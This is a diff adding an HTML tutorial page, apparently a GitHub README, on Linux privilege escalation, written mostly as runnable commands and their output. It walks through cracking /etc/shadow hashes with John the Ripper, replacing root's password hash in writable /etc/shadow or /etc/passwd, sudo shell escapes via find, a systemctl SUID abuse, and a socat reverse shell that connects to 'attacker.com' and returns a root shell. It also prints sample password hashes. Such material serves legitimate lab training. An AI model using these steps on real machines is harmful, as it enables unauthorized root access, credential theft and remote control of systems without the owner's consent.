@@ -1,0 +1,252 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="linux-privilege-escalation">Linux-Privilege-Escalation</h1>
+<p><img src="https://user-images.githubusercontent.com/79256105/165799766-5fb55283-1d8e-469b-909d-88baf3a845de.jpg" alt="maxresdefault"></p>
+<h1 id="-01-readable-etc-shadow-">🔥01: Readable /etc/shadow:</h1>
+<h4 id="-the-etc-shadow-file-contains-user-password-hashes-and-is-usually-readable-only-by-the-root-user-">👀The /etc/shadow file contains user password hashes and is usually readable only by the root user.</h4>
+<p>Note:  the /etc/shadow file on the VM is world-readable</p>
+<p>At first check permission of /etc/shadow file using :</p>
+<pre><code> ls -l /etc/<span class="hljs-built_in">shadow</span>
+
+-rw-r--rw- <span class="hljs-number">1</span> root <span class="hljs-built_in">shadow</span> <span class="hljs-number">842</span> Apr  <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">28</span> /etc/<span class="hljs-built_in">shadow</span>
+</code></pre><p>Then , view the contents of the /etc/shadow file uisng :</p>
+<pre><code>          cat /etc/shadow
+
+          root:$<span class="hljs-number">6</span>$LRq2u1SvWmPgF$zCIh5qzquQ31ZcsL0ifM9GKh.pQRwHSKjJQSJI4Tkl5ELRHjqWTzag8upywqk.jT6/niiOIaMF9XW1/BnN55Y/:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          daemon:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          bin:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          sys:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          sync:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          games:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          man:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          lp:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          mail:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          news:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          uucp:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          proxy:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          www-data:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          backup:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          list:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          irc:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          gnats:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          nobody:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          libuuid:!:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          Debian-exim:!:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          sshd:*:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          user:$<span class="hljs-number">6</span>$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:<span class="hljs-number">17298:0</span>:<span class="hljs-number">99999:7</span>:::
+          statd:*:<span class="hljs-number">17299:0</span>:<span class="hljs-number">99999:7</span>:::
+          mysql:!:<span class="hljs-number">18133:0</span>:<span class="hljs-number">99999:7</span>:::
+</code></pre><h4 id="-each-line-of-the-file-represents-a-user-a-user-s-password-hash-if-they-have-one-can-be-found-between-the-first-and-second-colons-of-each-line-">👀Each line of the file represents a user. A user&#39;s password hash (if they have one) can be found between the first and second colons (:) of each line.</h4>
+<p>Save the root user&#39;s hash to a file called hash.txt on your Machine  and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:</p>
+<pre><code> john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash.txt
+</code></pre><p>Switch to the root user, using the cracked password:</p>
+<pre><code><span class="hljs-attribute">su root</span>
+</code></pre><h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h1 id="-02-writeable-etc-shadow">🔥02: writeable /etc/shadow</h1>
+<p>check the permssion of  /etc/shadow file using /etc/shadow. If you can edit the file , you can easily change the password of root .</p>
+<pre><code> ls -l /etc/<span class="hljs-built_in">shadow</span> 
+-rw-r--rw- <span class="hljs-number">1</span> root <span class="hljs-built_in">shadow</span> <span class="hljs-number">842</span> Apr  <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">28</span> /etc/<span class="hljs-built_in">shadow</span>
+</code></pre><h4 id="-look-we-can-edit-etc-shadow-file-as-we-have-permission">👀 Look : We can edit /etc/shadow file as we have  permission</h4>
+<p>Generate a new password hash with a password of your choice :</p>
+<p>Here  , we  use mkpasswd command for generate a password </p>
+<p>Command :</p>
+<pre><code>       mkpasswd -m sha<span class="hljs-number">-512</span> iloveislam
+</code></pre><p>Here  ,    </p>
+<pre><code>       -m use <span class="hljs-keyword">for</span> <span class="hljs-function"><span class="hljs-keyword">method</span> 
+
+       <span class="hljs-title">sha</span>-512 <span class="hljs-title">use</span> <span class="hljs-title">for</span> <span class="hljs-title">hashing</span> <span class="hljs-title">the</span> <span class="hljs-title">pasword</span> 
+
+       <span class="hljs-title">iloveislam</span> <span class="hljs-title">is</span> <span class="hljs-title">the</span> <span class="hljs-title">password</span> </span>
+</code></pre><p>Then , edit the /etc/shadow file and replace the original root user&#39;s password hash with the one you just generated.</p>
+<p>Switch to the root user, using the new password:</p>
+<p>su root</p>
+<h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h1 id="-03-writable-etc-passwd-">🔥03:Writable /etc/passwd :</h1>
+<h4 id="-the-etc-passwd-file-contains-information-about-user-accounts-it-is-world-readable-but-usually-only-writable-by-the-root-user-historically-the-etc-passwd-file-contained-user-password-hashes-and-some-versions-of-linux-will-still-allow-password-hashes-to-be-stored-there-">⏰The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.</h4>
+<p>Note : that the /etc/passwd file is world-writable</p>
+<p>At first check permission of /etc/passwd file using </p>
+<pre><code> ls -l /etc/passwd
+
+-rw-r--rw-<span class="hljs-number"> 1 </span>root passwd<span class="hljs-number"> 842 </span>Apr <span class="hljs-number"> 9 </span>17:28 /etc/shadow
+</code></pre><h4 id="-generate-a-new-password-hash-with-a-password-of-your-choice-">🧑Generate a new password hash with a password of your choice:</h4>
+<pre><code><span class="hljs-attribute">openssl passwd newpasswordhere</span>
+</code></pre><h4 id="-edit-the-etc-passwd-file-and-place-the-generated-password-hash-between-the-first-and-second-colon-of-the-root-user-s-row-replacing-the-x-">👀Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user&#39;s row (replacing the &quot;x&quot;).</h4>
+<p>Switch to the root user, using the new password:</p>
+<pre><code><span class="hljs-attribute">su root</span>
+</code></pre><h4 id="-alternatively-copy-the-root-user-s-row-and-append-it-to-the-bottom-of-the-file-changing-the-first-instance-of-the-word-root-to-newroot-and-placing-the-generated-password-hash-between-the-first-and-second-colon-replacing-the-x-">👁️ Alternatively, copy the root user&#39;s row and append it to the bottom of the file, changing the first instance of the word &quot;root&quot; to &quot;newroot&quot; and placing the generated password hash between the first and second colon (replacing the &quot;x&quot;).</h4>
+<pre><code>      user<span class="hljs-variable">@debian</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>nano /etc/passwd
+      <span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+      <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+      <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sh</span>
+      www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/bin/sh
+      <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/sh</span>
+      <span class="hljs-symbol">libuuid:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/libuuid</span><span class="hljs-symbol">:/bin/sh</span>
+      Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span>
+      <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+      <span class="hljs-symbol">user:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:user</span>,,,<span class="hljs-symbol">:/home/user</span><span class="hljs-symbol">:/bin/bash</span>
+      <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span>
+      <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/var/lib/mysql</span><span class="hljs-symbol">:/bin/false</span>
+</code></pre><p>Now switch to the newroot user, using the new password:</p>
+<pre><code><span class="hljs-attribute">su newroot</span>
+</code></pre><h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h1 id="-04-shell-escape-sequences-">🔥04: Shell Escape Sequences :</h1>
+<h4 id="-shell-escape-sequences-is-so-powerful-process-for-privilege-escalation-in-this-process-attacker-use-shell-for-privilege-escalation">👀 Shell Escape sequences is so powerful process for Privilege Escalation . In this process attacker use shell for privilege Escalation</h4>
+<h3 id="process-">Process :</h3>
+<pre><code>         step <span class="hljs-number">1</span> : check listed programs which sudo allows your <span class="hljs-keyword">normal</span> user <span class="hljs-built_in">to</span> run <span class="hljs-keyword">using</span>  <span class="hljs-string">" sudo -l "</span> <span class="hljs-keyword">command</span> <span class="hljs-title">on</span> <span class="hljs-title">terminal</span> 
+
+         step <span class="hljs-number">2</span>: run <span class="hljs-built_in">shell</span> escape according <span class="hljs-built_in">to</span> your listed programs that was <span class="hljs-keyword">the</span> <span class="hljs-built_in">result</span> <span class="hljs-keyword">of</span> sudo -l <span class="hljs-keyword">command</span> 
+</code></pre><p>☑️Attension Please : Visit GTFOBins (<a href="https://gtfobins.github.io">https://gtfobins.github.io</a>) and search for some of the program names. If the program is listed with &quot;sudo&quot; as a function, you can use it to elevate privileges, usually via an escape sequence.</p>
+<p>Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.</p>
+<h4 id="example-">Example :</h4>
+<h4 id="step-1-">Step 1 :</h4>
+<pre><code>          sudo - l 
+
+ Matching Defaults entries <span class="hljs-keyword">for</span> user on <span class="hljs-keyword">this</span> <span class="hljs-string">host:</span>
+     env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+ User user may run the following commands on <span class="hljs-keyword">this</span> <span class="hljs-string">host:</span>
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>sbin/iftop
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/find
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/nano
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/vim
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/man
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/awk
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/less
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/ftp
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>bin/nmap
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>sbin/apache2
+     (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/bin/</span>more
+</code></pre><p> Ok  , that&#39;s great  . Now check all listed program escape shell from GTFOBins  one by one .</p>
+<h4 id="step-2-go-to-gtfobins-website-and-choice-escape-shell-according-to-your-sudo-l-result-suppose-we-wanna-check-root-nopasswd-usr-bin-find-">Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )</h4>
+<pre><code>     GTFOBins Result :
+
+                    sudo <span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh \; -quit
+</code></pre><h4 id="step-3-copy-the-shell-escape-of-gtfobins-and-paste-it-on-your-terminal">Step 3: Copy the shell escape of GTFOBins and paste it on your terminal</h4>
+<pre><code> user<span class="hljs-variable">@debian</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo find . -exec /bin/sh \; -quit
+ sh-<span class="hljs-number">4.1</span><span class="hljs-comment"># </span>
+</code></pre><h4 id="step-4-wow-you-did-well-now-use-id-command-and-see-you-are-now-root-">Step 4: Wow, you did well . Now , use id command and see you are now root 🥰</h4>
+<pre><code> sh<span class="hljs-number">-4.1</span># id
+ uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
+ sh<span class="hljs-number">-4.1</span># 
+</code></pre><h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h1 id="-05-root-privilegers-using-shell-escape-sequences-">🔥05: Root Privilegers using Shell Escape Sequences :</h1>
+<p>Acording to Previous process we will use :sudo -l and then  check Shell Escape Sequences and check it on GFTOBins</p>
+<h1 id="step-1-">Step 1:</h1>
+<pre><code>    sudo <span class="hljs-_">-l</span> 
+</code></pre><p>Result :</p>
+<pre><code>matching Defaults entries <span class="hljs-keyword">for</span> falconfeast on <span class="hljs-symbol">inclusion:</span>
+env_reset, mail_badpass,
+secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>
+User falconfeast may run the following commands on <span class="hljs-symbol">inclusion:</span>
+(root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/socat
+</code></pre><h1 id="step-2-now-check-root-nopasswd-usr-bin-socat-in-gftobins-and-use-it">Step 2: Now check (root) NOPASSWD: /usr/bin/socat in GFTobins and use it</h1>
+<p>Here , socat is our target Shell Escape which use for connected other machine . For liseting socat we must  upload Reverse Shell on our target Machine
+Like that :</p>
+<pre><code>RHOST=attacker.com
+RPORT=<span class="hljs-number">12345</span>
+sudo socat tcp-<span class="hljs-string">connect:</span><span class="hljs-string">$RHOST:</span>$RPORT <span class="hljs-string">exec:</span><span class="hljs-regexp">/bin/</span>sh,pty,stderr,setsid,sigint,sane
+</code></pre><p>OR :</p>
+<pre><code>sudo socat tcp-<span class="hljs-string">connect:</span>my-machine <span class="hljs-string">ip:</span>my-machine port number  <span class="hljs-string">exec:</span><span class="hljs-regexp">/bin/</span>sh,pty,stderr,setsid,sigint,sane
+</code></pre><h1 id="step-3-after-complete-those-steps-sucessfully-we-must-use-following-command-in-your-pc-">Step 3: After  , complete those steps sucessfully   We must use following command in your  pc :</h1>
+<pre><code>    socat file:`tty`,raw,echo=<span class="hljs-number">0</span> tcp-listen:<span class="hljs-number">12345</span>
+</code></pre><p>If we successfully complete all those steps we get root power of target machine like that :</p>
+<pre><code>socat file:`tty`,raw,<span class="hljs-attr">echo=0</span> tcp-listen:<span class="hljs-number">12345</span>
+/bin/sh: <span class="hljs-number">0</span>: can't access tty; job control turned off
+<span class="hljs-comment">#id</span>
+<span class="hljs-attr">uid=0(root)</span> <span class="hljs-attr">gid=0(root)</span> <span class="hljs-attr">groups=0(root)</span>
+<span class="hljs-comment">#whoami</span>
+root
+</code></pre><h1 id="-06-root-privilegers-using-shell-escape-sequences-">🔥06: Root Privilegers using Shell Escape Sequences :</h1>
+<h1 id="step-01-use-given-below-command">Step 01 : Use given below command</h1>
+<pre><code>        <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">4000</span> -type f -exec ls -ld {} \; <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>
+</code></pre><h1 id="check-result-and-analyse-properly">Check result and analyse properly</h1>
+<pre><code>       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">32944</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/newuidmap
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">49584</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/chfn
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">32944</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/newgidmap
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">136808</span> Jul  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> /usr/bin/sudo
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">40432</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/chsh
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">54256</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/passwd
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">23376</span> Jan <span class="hljs-number">15</span>  <span class="hljs-number">2019</span> /usr/bin/pkexec
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">39904</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/newgrp
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">75304</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /usr/bin/gpasswd
+       -rwsr-sr-x <span class="hljs-number">1</span> daemon daemon <span class="hljs-number">51464</span> Jan <span class="hljs-number">14</span>  <span class="hljs-number">2016</span> /usr/bin/at
+       -rwsr-sr-x <span class="hljs-number">1</span> root root <span class="hljs-number">98440</span> Jan <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> /usr/lib/snapd/snap-confine
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">14864</span> Jan <span class="hljs-number">15</span>  <span class="hljs-number">2019</span> /usr/lib/policykit<span class="hljs-number">-1</span>/polkit-agent-helper<span class="hljs-number">-1</span>
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">428240</span> Jan <span class="hljs-number">31</span>  <span class="hljs-number">2019</span> /usr/lib/openssh/ssh-keysign
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">10232</span> Mar <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> /usr/lib/eject/dmcrypt-get-device
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">76408</span> Jul <span class="hljs-number">17</span>  <span class="hljs-number">2019</span> /usr/lib/squid/pinger
+       -rwsr-xr-- <span class="hljs-number">1</span> root messagebus <span class="hljs-number">42992</span> Jan <span class="hljs-number">12</span>  <span class="hljs-number">2017</span> /usr/lib/dbus<span class="hljs-number">-1.0</span>/dbus-daemon-launch-helper
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">38984</span> Jun <span class="hljs-number">14</span>  <span class="hljs-number">2017</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">40128</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> /bin/su
+
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">659856</span> Feb <span class="hljs-number">13</span>  <span class="hljs-number">2019</span> /bin/systemctl
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">44168</span> May  <span class="hljs-number">7</span>  <span class="hljs-number">2014</span> /bin/ping
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">30800</span> Jul <span class="hljs-number">12</span>  <span class="hljs-number">2016</span> /bin/fusermount
+       -rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">35600</span> Mar  <span class="hljs-number">6</span>  <span class="hljs-number">2017</span> /sbin/mount.cifs
+</code></pre><h1 id="step-3-go-to-gtfobins-website-and-choice-escape-shell-according-to-your-result">Step 3 : Go to GTFOBins website and choice escape shell according to your result</h1>
+<h3 id="example-">Example :</h3>
+<p>if -rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl is vulnerable follow given below steps</p>
+<pre><code>TF=$(mktemp).service
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id &gt; /tmp/output"
+[Install]
+WantedBy=multi-user.target'</span> &gt; <span class="hljs-variable">$TF</span>
+sudo systemctl link <span class="hljs-variable">$TF</span>
+sudo systemctl <span class="hljs-built_in">enable</span> --now <span class="hljs-variable">$TF</span>
+</code></pre><h1 id="step-4-">Step 4:</h1>
+<pre><code>     cat <span class="hljs-regexp">/tmp/</span>output
+</code></pre><h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h1 id="finding-and-exploiting-suid-guid-files">Finding And Exploiting SUID/GUID Files</h1>
+<p>The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
+<h1 id="what-is-an-suid-binary-">What is an SUID binary?</h1>
+<p>As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:</p>
+<p>r = read</p>
+<p>w = write</p>
+<p>x = execute</p>
+<pre><code><span class="hljs-keyword">user</span>     <span class="hljs-title">group</span>     others
+
+rwx       rwx       rwx
+
+<span class="hljs-number">421</span>       <span class="hljs-number">421</span>       <span class="hljs-number">421</span>
+</code></pre><p>The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using &quot;chmod&quot; as 755, then it will be: rwxr-xr-x.</p>
+<p>But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).</p>
+<p>Therefore, the permissions to look for when looking for SUID is:</p>
+<p>SUID:</p>
+<p>rws-rwx-rwx</p>
+<p>GUID:</p>
+<p>rwx-rws-rwx</p>
+<h1 id="finding-suid-binaries">Finding SUID Binaries</h1>
+<p>We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: 👽&quot;find / -perm -u=s -type f 2&gt;/dev/null&quot; 👽 to search the file system for SUID/GUID files. Let&#39;s break down this command.</p>
+<pre><code>  find / -perm -u=s -<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>
+</code></pre><p>find - Initiates the &quot;find&quot; command</p>
+<p>/ - Searches the whole file system</p>
+<p>-perm - searches for files with specific permissions</p>
+<p>-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form</p>
+<p>-type f - Only search for files</p>
+<p>2&gt;/dev/null - Suppresses errors</p>
+<h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+<h2 id="suid-vulnerable-searching-and-bash-convert-command">Suid vulnerable searching  and Bash Convert Command</h2>
+<h4 id="use-for-bash-convert-">use for bash convert :</h4>
+<pre><code>                                   <span class="hljs-number">1</span>. python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span>
+                                   <span class="hljs-number">2</span>. script -qc <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>
+</code></pre><h4 id="suid-searching-">suid searching :</h4>
